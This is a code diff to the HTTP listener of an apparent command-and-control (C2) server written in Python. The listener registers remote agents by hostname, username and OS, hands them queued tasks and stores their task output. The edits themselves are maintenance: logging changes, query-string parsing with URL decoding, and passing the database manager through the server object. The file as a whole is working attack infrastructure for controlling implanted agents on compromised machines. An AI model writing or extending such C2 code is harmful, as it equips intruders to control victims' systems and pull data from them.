@@ -1,4 +1,5 @@
 import http.server
+import logging
 import socketserver
 import threading
 import json
@@ -6,6 +7,7 @@ import os
 import sys
 import uuid # For generating session IDs if agent doesn't provide
 import time # For MockDBManager checkin_time
+import urllib.parse # NEW: For URL decoding query parameters
 
 # Add necessary paths to sys.path for imports
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'utils'))
@@ -16,13 +18,22 @@ from logger import setup_logger
 from db_manager import DBManager
 # No encoder needed directly here for simple JSON, but keep it for future if using custom encoding
 
-logger = setup_logger('http_listener', 'http_listener.log')
+logger = setup_logger('http_listener', 'logs/http_listener.log', level=logging.DEBUG, console_output=False)
 
 class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
     """
     Custom HTTP request handler for the C2 server.
     Handles incoming beaconing, registration, and task output.
     """
+    def log_message(self, format, *args):
+        """
+        Overrides the default BaseHTTPRequestHandler logging.
+        Redirects HTTP access logs to our custom http_listener logger.
+        """
+        # self.address_string() gets the client IP:Port
+        # format % args gives the full HTTP request line (e.g., "GET /beacon HTTP/1.1" 200 -)
+        logger.debug(f"{self.address_string()} - {format % args}")
+        
     def do_GET(self):
         """Handle GET requests (e.g., agent beaconing, task retrieval)."""
         logger.debug(f"Received GET request from {self.client_address[0]}: {self.path}")
@@ -67,19 +78,19 @@ class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
             return
 
         query_string = params[1]
-        query_params = dict(qc.split('=', 1) for qc in query_string.split('&') if '=' in qc)
+        # urllib.parse.parse_qs handles multiple values for a key, dict() for single
+        query_params = dict(urllib.parse.parse_qs(query_string))
 
-        session_id = query_params.get('session_id')
-        agent_info_str = query_params.get('info') # Expected format: hostname|username|os_info
+        session_id = query_params.get('session_id', [None])[0] # Get first value if list
+        agent_info_str_encoded = query_params.get('info', [None])[0] # Get first value if list
 
-        if not session_id or not agent_info_str:
+        if not session_id or not agent_info_str_encoded:
             logger.warning(f"Malformed beacon request from {self.client_address[0]}. Missing session_id or info.")
             self._send_response(400, 'text/plain', 'Bad Request: Missing session_id or info.')
             return
 
-        # Decode agent_info_str if it was Base64 encoded by the agent
-        # For simple HTTP, we'll assume direct string for now to avoid early complexity
-        # agent_info_str = DataEncoder.decode(agent_info_str) # If using encoder
+        # NEW: URL-decode the agent_info_str_encoded
+        agent_info_str = urllib.parse.unquote(agent_info_str_encoded)
 
         hostname, username, os_info = "Unknown", "Unknown", "Unknown"
         try:
@@ -87,7 +98,7 @@ class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
             if len(parts) == 3:
                 hostname, username, os_info = parts
             else:
-                logger.warning(f"Agent info string malformed: {agent_info_str}")
+                logger.warning(f"Agent info string malformed (after decode): {agent_info_str}")
         except Exception as e:
             logger.error(f"Error parsing agent info: {e}", exc_info=True)
 
@@ -95,7 +106,8 @@ class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         agent_ip = self.client_address[0]
 
         # Use the DBManager from the server context
-        db_manager = self.server.db_manager # Access DBManager via the server instance
+        # FIX: Access db_manager directly from the server instance
+        db_manager = self.server.db_manager
         agent_exists = db_manager.add_agent(session_id, hostname, username, os_info, agent_ip)
 
         if agent_exists:
@@ -123,7 +135,7 @@ class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
                 self._send_response(400, 'text/plain', 'Bad Request: Missing data.')
                 return
 
-            db_manager = self.server.db_manager
+            db_manager = self.server.db_manager # Access DBManager via the server instance
             # Need to get agent_id from session_id
             agent_db_entry = db_manager.get_agent_by_session_id(session_id) # Need to implement this in DBManager
             if not agent_db_entry:
@@ -153,15 +165,15 @@ class C2HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
             return
 
         query_string = params[1]
-        query_params = dict(qc.split('=', 1) for qc in query_string.split('&') if '=' in qc)
-        session_id = query_params.get('session_id')
+        query_params = dict(urllib.parse.parse_qs(query_string)) # Use parse_qs for consistency
+        session_id = query_params.get('session_id', [None])[0]
 
         if not session_id:
             logger.warning(f"Malformed task request from {self.client_address[0]}. Missing session_id.")
             self._send_response(400, 'text/plain', 'Bad Request: Missing session_id.')
             return
 
-        db_manager = self.server.db_manager
+        db_manager = self.server.db_manager # Access DBManager via the server instance
         agent_db_entry = db_manager.get_agent_by_session_id(session_id)
         if not agent_db_entry:
             logger.warning(f"Task request from unknown session_id: {session_id}")
@@ -201,14 +213,15 @@ class HTTPListener:
         """Runs the HTTP server."""
         try:
             # Create a custom handler that has access to the DBManager
-            # This is a bit of a hack around BaseHTTPRequestHandler's design
             handler_class = C2HTTPRequestHandler
-            handler_class.db_manager = self.db_manager # Pass DBManager instance to handler
 
             # Use socketserver.TCPServer to avoid issues with address reuse during rapid restarts
             # The allow_reuse_address is for the server itself, not the handler
             socketserver.TCPServer.allow_reuse_address = True
             self.httpd = socketserver.TCPServer((self.host, self.port), handler_class)
+
+            # FIX: Attach db_manager directly to the TCPServer instance
+            self.httpd.db_manager = self.db_manager
 
             logger.info(f"HTTP Server listening on {self.host}:{self.port}...")
             self.httpd.serve_forever() # Blocks until server is shut down
